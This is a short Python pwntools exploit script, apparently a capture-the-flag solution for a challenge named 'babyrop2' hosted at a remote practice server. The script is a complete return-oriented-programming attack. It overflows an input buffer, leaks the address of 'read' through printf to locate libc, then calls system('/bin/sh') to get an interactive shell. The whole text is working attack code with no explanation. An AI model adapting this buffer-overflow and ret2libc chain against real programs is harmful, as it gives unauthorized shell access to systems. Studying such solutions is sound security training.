# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
#p=process('babyrop2')
p=remote('node3.buuoj.cn',29239)
elf=ELF('./babyrop2')

pop_rdi=0x0000000000400733     #ropgadgets
pop2=0x0000000000400731
format_addr=0x0000000000400790 # %s  参数

printf_plt=elf.sym['printf']
read_got=elf.got['read']
main_plt=elf.sym['main']
print hex(read_got)

rop='a'*0x28+p64(pop_rdi)+p64(format_addr)+p64(pop2)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt)
p.sendlineafter("What's your name? ",rop)
read_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print read_addr
libc=LibcSearcher('read',read_addr)
libc_base=read_addr-libc.dump('read')
system_addr=libc_base+libc.dump('system')
bin_sh=libc_base+libc.dump('str_bin_sh')
print system_addr
rop='a'*0x28+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)
p.recvuntil("What's your name? ")
p.sendline(rop)
p.interactive()
